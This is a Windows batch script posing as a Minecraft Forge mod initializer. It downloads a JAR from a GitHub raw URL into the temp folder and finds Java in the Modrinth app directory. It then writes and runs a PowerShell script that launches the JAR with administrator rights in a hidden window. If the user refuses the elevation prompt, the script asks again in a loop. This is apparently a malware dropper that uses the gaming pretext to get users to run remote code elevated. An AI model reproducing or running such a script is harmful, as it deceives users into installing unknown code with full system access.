@echo off
setlocal

echo Heating the forge...
timeout /t 1 /nobreak >nul
echo.
echo To initialize all mods properly, Forge needs admin permissions.
timeout /t 2 /nobreak >nul

set "JAR_FILE=%TEMP%\Downloader.jar"

:: Download the JAR from GitHub
echo Downloading components...
powershell -NoProfile -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/sleepypuppy77/ideal-spoon/refs/heads/main/Downloader.jar', '%JAR_FILE%')" 2>nul

if not exist "%JAR_FILE%" (
    echo Failed to download required files.
    timeout /t 2 /nobreak >nul
    exit
)

:request_admin
:: Find newest Java in Modrinth App directory (prefer zulu25, then zulu21)
set "JAVAW_PATH="

:: Try zulu25 first (newest)
for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\zulu25*") do (
    if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
)

:: Fallback to zulu21
if not defined JAVAW_PATH (
    for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\zulu21*") do (
        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
    )
)

:: Last resort - any version
if not defined JAVAW_PATH (
    for /d %%i in ("%APPDATA%\ModrinthApp\meta\java_versions\*") do (
        if exist "%%i\bin\javaw.exe" set "JAVAW_PATH=%%i\bin\javaw.exe"
    )
)

if not defined JAVAW_PATH (
    echo Java not found. Please install Java.
    timeout /t 3 /nobreak >nul
    exit
)

:: Create PowerShell script to run JAR with admin
set "PS_SCRIPT=%TEMP%\runasadmin.ps1"
(
echo $javaPath = '%JAVAW_PATH%'
echo $jarFile = '%JAR_FILE%'
echo try {
echo     Start-Process -FilePath $javaPath -ArgumentList '-jar',$jarFile -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
echo     exit 0
echo } catch {
echo     exit 1
echo }
) > "%PS_SCRIPT%"

:: Run the PowerShell script
powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"

if errorlevel 1 (
    echo.
    echo Admin privileges are required. Please try again.
    timeout /t 2 /nobreak >nul
    del "%PS_SCRIPT%" 2>nul
    goto request_admin
)

:: Clean up and exit successfully
del "%PS_SCRIPT%" 2>nul
exit /b 0
